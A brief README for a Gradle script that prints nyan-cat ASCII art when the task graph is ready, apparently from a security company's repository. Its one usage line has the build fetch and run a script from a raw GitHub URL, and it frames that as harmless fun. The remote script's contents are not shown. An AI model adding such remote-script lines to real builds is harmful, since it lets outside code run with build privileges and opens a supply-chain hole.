# Gradle TaskGraph ASCII Art

This Gradle script prints an ASCII art whenever the task graph is ready. It uses the `gradle.taskGraph.whenReady` hook to ensure the art appears just before task execution begins.

## Usage

### Importing the Script

To use this script in your Gradle project, import it directly from your GitHub repository. Save the script as a separate file (e.g., `ascii-art.gradle`) in your repository, then reference it in your `build.gradle` file using:

```gradle
apply from: 'https://raw.githubusercontent.com/oxsecurity/gradle-plugin-nyan-cat/refs/heads/main/nyancat.gradle'
```

This script is a fun way to add a little personality to your Gradle tasks! üöÄ
